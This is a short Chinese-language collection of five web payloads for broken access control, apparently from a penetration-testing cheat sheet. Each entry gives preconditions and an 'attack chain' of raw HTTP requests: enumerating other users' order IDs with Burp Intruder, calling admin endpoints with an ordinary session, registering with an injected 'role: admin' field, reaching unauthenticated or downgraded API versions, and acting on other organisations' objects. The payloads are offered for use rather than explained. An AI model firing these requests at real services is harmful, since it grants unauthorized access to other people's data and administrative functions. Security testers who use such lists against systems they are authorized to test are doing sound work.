# 越权/访问控制 (Improper Access Control)

_5 条 web payload_

---

### 水平越权 (IDOR)  `idor-horizontal`
子类：**水平越权** · tags: `idor` `horizontal` `object-level`

**前置条件：**
- 资源以可预测ID标识
- 后端未校验当前用户是否拥有该资源

**攻击链：**

```http
# 用账号A的token访问账号B的资源
GET /api/orders/10086 HTTP/1.1
Authorization: Bearer <A_token>

# Burp Intruder批量枚举
GET /api/orders/§10086§ HTTP/1.1
```

---

### 垂直越权 (普通→管理员)  `vpe-admin-access`
子类：**垂直越权** · tags: `vertical` `admin` `broken-access`

**攻击链：**

```http
# 直接访问管理接口
GET /admin/users HTTP/1.1
Cookie: session=normal_user_session

GET /api/v1/admin/user-list HTTP/1.1
Authorization: Bearer normal_user_jwt
```

---

### 角色参数篡改  `role-param-tamper`
子类：**Mass Assignment** · tags: `role` `mass-assignment` `register`

**攻击链：**

```http
POST /api/register HTTP/1.1
Content-Type: application/json

{
  "username": "attacker",
  "password": "pass123",
  "role": "admin",
  "is_admin": true,
  "permissions": ["read","write","delete","admin"]
}
```

---

### 未授权API端点  `unauth-api-endpoint`
子类：**未授权访问** · tags: `unauth` `api` `version-downgrade`

**攻击链：**

```http
# 无认证直接访问
GET /api/v2/internal/users/export HTTP/1.1

# 旧版本降级（v1可能无鉴权）
GET /api/v1/users/8841/sensitive-data HTTP/1.1

# 路径变体
GET /api/admin/stats HTTP/1.1
GET /internal/api/users HTTP/1.1
```

---

### 对象级授权缺失  `olac-missing`
子类：**对象级授权** · tags: `olac` `nested` `foreign-key`

**攻击链：**

```http
# 嵌套资源：仅校验子资源，未校验父资源归属
GET /api/org/999/project/500/files HTTP/1.1
Cookie: session=attacker  # 999是他人组织

# 关联对象越权：创建资源时指向他人对象
POST /api/invoices HTTP/1.1
{"payment_method_id": 7788}  # 7788是他人支付方式

# 批量操作越权
POST /api/messages/batch-delete HTTP/1.1
{"ids": [1001, 1002, 9999, 10000]}  # 9999/10000是他人数据
```
